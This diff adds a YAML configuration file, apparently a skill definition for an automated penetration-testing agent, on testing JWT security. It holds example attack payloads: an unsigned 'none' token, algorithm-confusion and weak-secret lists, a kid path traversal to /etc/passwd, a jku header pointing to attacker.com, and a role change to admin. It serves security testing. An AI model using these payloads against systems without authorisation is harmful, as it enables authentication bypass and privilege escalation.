@@ -1,0 +1,79 @@
+name: jwt_testing
+description: JSON Web Token (JWT) security testing and exploitation techniques
+techniques:
+  - "JWT signature bypass"
+  - "Algorithm confusion attacks"
+  - "Key confusion attacks"
+  - "JWT header manipulation"
+  - "Weak secret brute forcing"
+  - "JWT injection attacks"
+tools:
+  - browser_navigate
+  - nuclei
+  - terminal_execute
+knowledge: |
+  JSON Web Tokens (JWT) are commonly used for authentication and authorization.
+  They consist of three parts: header, payload, and signature.
+  
+  ## JWT Structure:
+  - **Header**: Algorithm and token type
+  - **Payload**: Claims and user data
+  - **Signature**: Cryptographic signature
+  
+  ## Common JWT Vulnerabilities:
+  1. **None Algorithm**: Accept tokens without signature verification
+  2. **Algorithm Confusion**: Switch between symmetric and asymmetric algorithms
+  3. **Weak Secrets**: Brute force HMAC secrets
+  4. **Key Confusion**: Use public key as HMAC secret
+  5. **Header Injection**: Manipulate header parameters
+  
+  ## Testing Strategies:
+  - **Token Analysis**: Decode and analyze JWT structure
+  - **Algorithm Testing**: Test different signing algorithms
+  - **Signature Verification**: Test signature validation
+  - **Claim Manipulation**: Modify payload claims
+  - **Timing Attacks**: Exploit signature verification timing
+  
+  ## Tools and Techniques:
+  - Base64 decode JWT components
+  - Modify algorithm in header
+  - Brute force HMAC secrets
+  - Test with empty signature
+  - Exploit kid (Key ID) parameter
+examples:
+  - title: "None Algorithm Attack"
+    description: "Remove signature and set algorithm to 'none'"
+    payload: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."
+    validation: "Check if token is accepted without signature"
+  - title: "Algorithm Confusion (RS256 to HS256)"
+    description: "Change algorithm from RS256 to HS256 and use public key as secret"
+    payload: "Modified header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}"
+    validation: "Test if public key is used as HMAC secret"
+  - title: "Weak Secret Brute Force"
+    description: "Common weak secrets for HMAC signing"
+    payload: "Secrets: secret, password, 123456, jwt, key"
+    validation: "Try to verify signature with common secrets"
+  - title: "Kid Parameter Injection"
+    description: "Exploit Key ID parameter for path traversal"
+    payload: '{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../etc/passwd\"}'
+    validation: "Check if kid parameter is used unsafely"
+  - title: "JKU Header Exploitation"
+    description: "Exploit JWK Set URL parameter"
+    payload: '{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://attacker.com/jwks.json\"}'
+    validation: "Test if application fetches keys from attacker-controlled URL"
+  - title: "Privilege Escalation"
+    description: "Modify user role or permissions in payload"
+    payload: '{\"sub\":\"user123\",\"role\":\"admin\",\"iat\":1516239022}'
+    validation: "Check if modified claims grant elevated privileges"
+validation_methods:
+  - "Decode JWT tokens and analyze structure"
+  - "Test token acceptance with modified algorithms"
+  - "Verify signature validation by tampering with payload"
+  - "Test with empty or invalid signatures"
+  - "Check for timing differences in signature verification"
+  - "Test privilege escalation by modifying claims"
+references:
+  - "https://jwt.io/"
+  - "https://portswigger.net/web-security/jwt"
+  - "https://github.com/ticarpi/jwt_tool"
+  - "https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_JWT_Tokens.pdf"
